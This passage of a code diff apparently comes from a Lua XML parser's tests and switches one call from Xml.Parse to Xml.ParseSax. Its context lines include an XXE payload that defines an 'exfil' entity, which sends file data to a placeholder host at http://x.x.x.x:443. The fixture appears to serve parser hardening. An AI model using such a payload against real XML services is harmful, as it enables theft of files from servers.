@@ -23,7 +23,7 @@ local fml = [[
 	<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;%27%3E%22%3E
 ]]
 return function ()
-	local iterator = Xml.Parse (
+	local iterator = Xml.ParseSax (
 		[=[
 			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
 			  <path d="M30,1h40l29,29v40l-29,29h-40l-29-29v-40z" stroke="#000" fill="none"/> 
